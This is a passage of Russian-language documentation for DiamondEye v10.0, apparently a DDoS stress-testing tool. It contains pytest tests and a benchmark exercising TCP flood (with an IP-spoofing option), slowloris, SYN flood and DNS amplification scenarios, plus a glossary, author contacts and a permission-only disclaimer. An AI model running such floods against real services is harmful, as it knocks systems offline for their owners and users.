## 19. ТЕСТИРОВАНИЕ И QA

### 19.1. Unit-тесты

```python
# tests/test_attack.py
import pytest
from attack import DiamondEyeAttack

class TestDiamondEyeAttack:
    @pytest.fixture
    def attack_config(self):
        return {
            'url': 'http://localhost:8080',
            'workers': 2,
            'sockets': 10
        }
    
    @pytest.mark.asyncio
    async def test_attack_initialization(self, attack_config):
        """Тест инициализации атаки"""
        attack = DiamondEyeAttack(**attack_config)
        assert attack.url == attack_config['url']
        assert attack.workers == attack_config['workers']
    
    @pytest.mark.asyncio 
    async def test_worker_creation(self, attack_config):
        """Тест создания воркеров"""
        attack = DiamondEyeAttack(**attack_config)
        await attack._create_workers()
        assert len(attack.workers) == attack_config['workers']
```

### 19.2. Интеграционные тесты

```python
# tests/integration/test_tcp_flood.py
class TestTCPFlood:
    @pytest.mark.integration
    @pytest.mark.slow
    async def test_tcp_flood_localhost(self):
        """Интеграционный тест TCP флуда"""
        # Запуск тестового сервера
        test_server = await start_test_server()
        
        # Запуск атаки
        flood = TCPFlood(
            target_ip="127.0.0.1",
            target_port=test_server.port,
            workers=5,
            spoof_ip=False
        )
        
        # Выполнение на короткое время
        attack_task = asyncio.create_task(flood.start())
        await asyncio.sleep(3.0)
        await flood.stop()
        
        # Проверка результатов
        assert flood.sent_packets > 0
        assert flood.error_count < flood.sent_packets * 0.1
```

### 19.3. Нагрузочное тестирование

```python
# benchmarks/benchmark.py
class DiamondEyeBenchmark:
    """Бенчмарк производительности DiamondEye"""
    
    @staticmethod
    async def benchmark_all_scenarios():
        """Тестирование всех сценариев производительности"""
        scenarios = [
            ('http_flood', {'flood': True, 'workers': 100}),
            ('http2_multiplex', {'http2': True, 'workers': 50}),
            ('slowloris', {'slow': 0.3, 'workers': 30}),
            ('tcp_syn', {'attack_type': 'tcp', 'workers': 200}),
            ('dns_amp', {'attack_type': 'dns', 'workers': 50})
        ]
        
        results = {}
        for name, config in scenarios:
            print(f"🔧 Тестирование сценария: {name}")
            result = await DiamondEyeBenchmark._run_scenario(config)
            results[name] = result
            print(f"✅ {name}: {result['rps']} RPS, {result['success_rate']:.1%} успешных")
        
        return results
```

### 19.4. Security Testing

```python
# tests/security/test_security.py
class TestSecurity:
    """Тесты безопасности"""
    
    def test_forbidden_domains(self):
        """Тест блокировки запрещенных доменов"""
        security = SecurityManager()
        
        forbidden = [
            'https://google.com',
            'http://bank.example.gov',
            'https://microsoft.com/api'
        ]
        
        for url in forbidden:
            with pytest.raises(SecurityError):
                security.validate_target(url)
    
    def test_localhost_warning(self, capsys):
        """Тест предупреждения для localhost"""
        security = SecurityManager()
        
        security.validate_target('http://localhost:8080')
        captured = capsys.readouterr()
        
        assert 'localhost' in captured.out
```

---

## 20. СПРАВОЧНЫЕ МАТЕРИАЛЫ

### 20.1. Ключевые термины v10.0

| Термин | Описание |
|--------|----------|
| **RPS** | Requests Per Second (Запросов в секунду) |
| **PPS** | Packets Per Second (Пакетов в секунду) |
| **Worker** | Отдельный процесс/поток отправки запросов |
| **Socket** | Сетевое соединение внутри воркера |
| **Amplification** | Усиление трафика через сторонние серверы |
| **Slowloris** | Атака медленными неполными запросами |
| **HTTP/2 Rapid Reset** | Эксплуатация уязвимости в HTTP/2 |
| **Layer7** | Прикладной уровень (HTTP, HTTPS) |
| **Layer4** | Транспортный уровень (TCP, UDP) |
| **Recon** | Разведка и сбор информации |

### 20.2. Рекомендуемая литература

1. **HTTP/1.1 RFC 7230-7237** — базовый протокол
2. **HTTP/2 RFC 7540** — мультиплексирование
3. **HTTP/3 RFC 9114** — QUIC транспорт
4. **OWASP Testing Guide v4.0** — тестирование безопасности
5. **High Performance Browser Networking** — оптимизация сети
6. **Black Hat Python** — программирование для тестирования

### 20.3. Полезные инструменты

1. **Wireshark** — анализ сетевого трафика
2. **tcpdump** — захват пакетов в Linux
3. **httpx** — HTTP клиент для Python
4. **aiohttp** — асинхронный HTTP клиент/сервер
5. **psutil** — мониторинг системных ресурсов
6. **speedtest-cli** — измерение пропускной способности
7. **dnspython** — работа с DNS в Python

### 20.4. Контакты и поддержка

- **GitHub**: [https://github.com/UndefinedClear/DiamondEye](https://github.com/UndefinedClear/DiamondEye)
- **Telegram автора**: [@pelikan6](https://t.me/pelikan6)
- **Telegram сообщество**: [https://t.me/x_xffx_x](https://t.me/x_xffx_x)
- **Email**: larion626@gmail.com
- **Документация**: [GitHub Wiki](https://github.com/UndefinedClear/DiamondEye/wiki)

### 20.5. Сообщество и вклад

1. **Reporting Issues**: GitHub Issues
2. **Feature Requests**: GitHub Discussions
3. **Pull Requests**: Welcome with tests
4. **Documentation**: Wiki contributions
5. **Translations**: Help with internationalization

---

## 📄 ЛИЦЕНЗИЯ И ЮРИДИЧЕСКАЯ ИНФОРМАЦИЯ

**Лицензия:** MIT License  
**Авторские права:** © 2025 DiamondEye Project  
**Версия:** 10.0 (Stable)

**Ответственное использование:**
- Только для тестирования систем с явного письменного разрешения
- Только в контролируемых средах
- Только для образовательных целей
- Только для оценки собственной инфраструктуры

**Отказ от ответственности:**
Разработчики не несут ответственности за:
- Несанкционированное использование инструмента
- Нарушение законов вашей страны
- Ущерб, причиненный третьим лицам
- Последствия неправильного использования
- Использование в преступных целях

**Этический кодекс:**
1. Всегда получайте письменное разрешение владельца системы
2. Ограничивайте тесты контролируемыми средами
3. Сообщайте об обнаруженных уязвимостях ответственно
4. Используйте знания для защиты, а не атаки
5. Уважайте приватность и законы

**Дисклеймер для исследователей:**
Этот инструмент предназначен для:
- Security researchers
- Penetration testers
- System administrators
- Educational purposes
- Legitimate security testing

Любое другое использование может быть незаконным.

---

**Конец технической документации DiamondEye v10.0**

*Последнее обновление: 2025 | Версия документа: 3.0*